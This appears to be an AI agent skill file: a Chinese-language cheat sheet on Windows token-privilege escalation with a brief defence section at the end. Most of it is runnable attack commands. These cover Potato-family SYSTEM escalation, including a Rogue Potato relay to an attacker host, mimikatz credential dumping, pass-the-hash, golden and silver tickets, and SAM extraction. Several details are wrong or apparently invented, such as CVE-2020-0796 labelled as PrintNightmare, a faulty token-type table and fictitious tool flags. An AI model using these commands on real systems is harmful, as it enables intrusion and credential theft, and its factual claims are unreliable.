---
name: "windows-token-privileges"
description: "Windows token manipulation, impersonation, and privilege escalation techniques including the complete Potato family (Juicy Potato, PrintSpoofer, Rogue Potato)"
version: "1.0.0"
---

# Windows Token Privileges & Potato Family

> Windows token manipulation, impersonation, and comprehensive Potato family privilege escalation techniques.

## 概述

令牌模拟是Windows提权中最强大的技术之一。"土豆家族"(Potato Family)是一系列利用令牌模拟漏洞的工具集合。

## 令牌类型

### 令牌类型详解

| 类型 | 描述 |
|------|------|
| Delegate | 交互式登录，可用于模拟 |
| Network | 网络登录，不能用于模拟 |
| Impersonate | 可用于模拟 |
| Anonymous | 空会话 |

### 关键权限

```powershell
whoami /priv
```

重要权限：

- **SeImpersonatePrivilege** - 允许进程模拟其他用户 ⭐
- **SeAssignPrimaryTokenPrivilege** - 允许分配主令牌 ⭐
- **SeBackupPrivilege** - 允许备份文件
- **SeRestorePrivilege** - 允许恢复文件
- **SeDebugPrivilege** - 允许调试进程
- **SeTakeOwnershipPrivilege** - 允许获取所有权

## 土豆家族概述

### 家族成员

| 工具 | 攻击方式 | 要求 | 适用系统 |
|------|---------|------|---------|
| Juicy Potato | DCOM激活滥用 | SeImpersonatePrivilege | Win7/2008R2-2019 |
| PrintSpoofer | Print Spooler漏洞 | SeImpersonatePrivilege | Win10/2019+ |
| Rogue Potato | RPC分流 | SeImpersonatePrivilege | Win10/2019+ |
| Sweet Potato | 集合工具 | SeImpersonatePrivilege | 全部 |
| Ghost Potato | 检测绕过 | SeImpersonatePrivilege | Win7/2008R2 |

### 攻击原理

```
1. 攻击者创建一个恶意RPC服务器
2. 触发SYSTEM向攻击者服务器认证
3. 攻击者获取SYSTEM令牌
4. 模拟SYSTEM执行命令
```

## Juicy Potato

### 检测

```powershell
# 检查权限
whoami /priv | findstr Impersonate

# 示例输出：
# SeImpersonatePrivilege        Impersonate a client after authentication  Enabled
```

### 基本利用

```powershell
# 基本用法
JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -t *

# 指定CLSID
JuicyPotato.exe -l 1337 -p "cmd.exe" -t * -c {CLSID}

# 尝试所有CLSID
JuicyPotato.exe -l 1337 -p "whoami" -c ALL

# 仅检查（不执行）
JuicyPotato.exe -z
```

### 常用CLSID

| 系统版本 | CLSID | COM服务器 |
|---------|-------|----------|
| Win10/2016/2019 | {4991D34B-80A1-4291-83B6-3328366B9097} | Task Scheduler |
| Win10/2016/2019 | {0F87369F-A4E6-4D9C-9BCD-3C27DA4A3F45} | WMIVideoProc |
| Server 2012R2 | {8BC3F05E-D86B-11D0-A075-00C04FB68820} | MMC20 |
| Win7/2008R2 | {6BBD1EE2-1953-47D3-91C6-986FFBD3A23C} | DirectShow |

### PowerShell版本

```powershell
# 导入模块
Import-Module .\JuicyPotato.ps1
Invoke-JuicyPotato -Command "C:\Windows\System32\cmd.exe"
```

## PrintSpoofer

### 攻击原理

利用Print Spooler服务强制SYSTEM认证到攻击者控制的RPC端点。

### 检测

```powershell
# 检查Print Spooler服务
Get-Service Spooler
sc query spooler

# PowerShell检查
Get-Process | Where-Object {$_.ProcessName -eq "spoolsv.exe"}
```

### 利用

```powershell
# 简单命令执行
PrintSpoofer.exe -i -c "cmd.exe"

# 执行特定命令
PrintSpoofer.exe -c "whoami"
PrintSpoofer.exe -c "nt authority\system cmd"

# PowerShell
PrintSpoofer.exe -c "powershell.exe"

# 详细模式
PrintSpoofer.exe -v -i -c "cmd.exe"
```

### PowerShell实现

```powershell
# 使用SweetPotato模块
Install-Module -Name SweetPotato -Scope CurrentUser
Invoke-SweetPotato -Command "whoami"
```

## Rogue Potato

### 攻击原理

使用RPC分流技术，即使Juicy Potato失败也能工作。

### 攻击设置

```bash
# 在Kali上设置中继服务器
socat TCP-LISTEN:135,fork,reuseaddr TCP:127.0.0.1:9999 &
```

### Windows目标执行

```powershell
# 基本用法 - 重定向到Kali (192.168.1.100)
RoguePotato.exe -r 192.168.1.100 -e "cmd.exe"

# 指定命令
RoguePotato.exe -r 192.168.1.100 -c "whoami"
RoguePotato.exe -r 192.168.1.100 -c "nt authority\system cmd"

# 使用不同端口
RoguePotato.exe -r 192.168.1.100 -e "powershell.exe" -l 12345
```

### PowerShell版本

```powershell
# 使用RoguePotatoPS模块
Import-Module .\RoguePotatoPS.psd1
Invoke-RoguePotato -IpAttacker 192.168.1.100 -Command "whoami"
```

## 其他土豆变体

### Sweet Potato

```powershell
# 自动模式
SweetPotato.exe -c whoami

# 指定方法
SweetPotato.exe -m Juicy -c whoami      # Juicy Potato方法
SweetPotato.exe -m Spooler -c whoami    # Print Spooler方法
SweetPotato.exe -m Rogue -r 192.168.1.100 -c whoami  # Rogue Potato方法
```

### Ghost Potato

```powershell
# 绕过特定检测
GhostPotato.exe -l 1337 -c "whoami" -bypass

# 隐蔽模式
GhostPotato.exe -l 1337 -c "whoami" -stealth
```

## 令牌窃取

### Incognito (Meterpreter)

```powershell
# 加载incognito
load incognito

# 列出可用令牌
list_tokens -u
list_tokens -g

# 模拟用户
impersonate_token "NT AUTHORITY\SYSTEM"
impersonate_token "BUILTIN\Administrators"

# 窃取进程令牌
steal_token <PID>

# 放弃令牌
drop_token
```

### 使用mimikatz

```powershell
# 转储令牌
mimikatz # sekurlsa::logonpasswords

# 列出Kerberos票据
mimikatz # kerberos::list /export

# 使用票据
mimikatz # kerberos::ptt ticket.kirbi
```

## Pass-the-Hash

```powershell
# 使用NTLM哈希
sekurlsa::pth /user:admin /domain:domain.com /ntlm:<hash>

# 使用Impacket
psexec.py -hashes :<NTLM hash> domain/user@target
```

## Pass-the-Ticket

```powershell
# 提取Kerberos票据
mimikatz # kerberos::list /export

# 金票据
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash

# 银票据
mimikatz # kerberos::silver /user:admin /domain:domain.com /target:server /service:cifs /rc4:hash

# 使用票据
mimikatz # kerberos::ptt ticket.kirbi
```

## 权限滥用

### SeBackupPrivilege

```powershell
# 备份SAM数据库
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# 使用Impacket提取
secretsdump.py -sam sam -system system LOCAL
```

### SeRestorePrivilege

```powershell
# 修改受保护文件
takeown /f C:\Windows\System32\config\sam
icacls C:\Windows\System32\config\sam /grant user:F
```

### SeDebugPrivilege

```powershell
# 附加到LSASS进程
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

## CLSID查找

```powershell
# 搜索有用的CLSID
reg query "HKLM\SOFTWARE\Classes\CLSID" /s /f "Implemented Categories"

# PowerShell - 查找所有本地服务器CLSID
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -Recurse | Where-Object {
    $_.Name -like "*LocalServer32*"
} | Select-Object PSChildName

# 查找JWT CLSID
Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -Recurse | Where-Object {
    (Get-ItemProperty $_.PSPath -Name "Implemented Categories" -EA SilentlyContinue) -match "Token"
} | Select-Object PSChildName
```

## 工具

| 工具 | 描述 |
|------|------|
| incognito | Meterpreter令牌管理 |
| mimikatz | 凭证和令牌提取 |
| JuicyPotato | 令牌模拟 |
| PrintSpoofer | 令牌滥用 |
| RoguePotato | RPC分流 |
| SweetPotato | 集合工具 |
| Rubeus | Kerberos工具 |

## 利用条件

| 权限 | 利用工具 |
|------|---------|
| SeImpersonatePrivilege | Juicy Potato, PrintSpoofer, Rogue Potato |
| SeAssignPrimaryTokenPrivilege | Juicy Potato |
| SeDebugPrivilege | mimikatz, procdash |
| SeBackupPrivilege | SAM转储 |
| SeRestorePrivilege | 文件修改 |

## 防御建议

### 检测

```powershell
# 查找DCOM激活事件
Get-WinEvent -LogName Security | Where-Object {$_.Message -match "DCOM"}

# 检查异常进程创建
Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4688} | Where-Object {
    $_.Message -match "JuicyPotato|PrintSpoofer"
}
```

### 防御措施

- 限制令牌权限分配
- 启用令牌过滤
- 禁用不必要的服务
- 监控令牌滥用
- 限制高权限账户使用
- 启用Credential Guard

### 服务强化

```powershell
# 禁用Print Spooler（如果不需要）
Stop-Service Spooler
Set-Service Spooler -StartupType Disabled

# 通过组策略限制权限
# Computer Configuration > Windows Settings > Security Settings > Local Policies > User Rights Assignment
```

## 参考资源

### 官方仓库

| 工具 | 仓库 |
|------|------|
| Juicy Potato | https://github.com/ohpe/juicy-potato |
| PrintSpoofer | https://github.com/itm4n/PrintSpoofer |
| Rogue Potato | https://github.com/antonioCoco/RoguePotato |
| Sweet Potato | https://github.com/CCob/SweetPotato |
| Rubeus | https://github.com/GhostPack/Rubeus |
| mimikatz | https://github.com/gentilkiwi/mimikatz |

### 相关CVE

| CVE | 漏洞 | 影响系统 |
|-----|------|---------|
| CVE-2019-1384 | Ghost Potato | Win7/2008R2 |
| CVE-2020-0796 | PrintNightmare | Win10/2019 |
| CVE-2021-36942 | PetitPotam | Server 2016/2019 |

### 详细文档

- [完整土豆家族文档](./Potato%20Family.md)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [LOLBAS项目](https://lolbas-project.github.io/)
